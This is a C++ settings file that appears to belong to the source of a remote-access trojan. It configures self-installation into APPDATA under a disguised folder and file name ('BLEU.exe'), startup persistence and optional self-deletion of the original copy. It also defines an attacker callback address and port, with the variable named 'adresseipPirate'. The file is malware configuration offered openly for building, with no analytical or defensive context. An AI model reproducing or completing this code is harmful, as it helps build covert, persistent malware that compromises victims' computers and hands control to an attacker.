//
// value generale
//
#include "Settings.h"

bool Settings::installSelf = true;
bool Settings::setStartupSelf = true;
bool Settings::startOnNextBoot = false;
bool Settings::meltSelf = false;



std::string Settings::installLocation = "APPDATA";
std::string Settings::folderName = "Fichiers BLEU";
std::string Settings::startupName = "demarrage BLEU";
std::string Settings::fileName = "BLEU.exe";


static const char * adresseipPirate = "127.0.0.1";
static unsigned short portPirate = 6452;
